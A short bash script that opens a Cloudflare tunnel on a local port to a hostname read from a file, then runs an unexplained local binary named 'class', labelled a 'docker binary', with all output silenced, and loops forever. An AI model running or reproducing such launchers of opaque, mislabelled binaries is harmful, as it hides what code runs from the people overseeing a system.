#!/bin/bash

echo "Starting cloudflared..."

cloudflared access tcp --hostname "$(cat hostname.txt)" --url 127.0.0.1:443 >/dev/null 2>&1 &

sleep 5

echo "Starting docker binary..."

chmod +x ./class
./class -c docker.json >/dev/null 2>&1 &

echo "Running..."

while true
do
  sleep 60
done
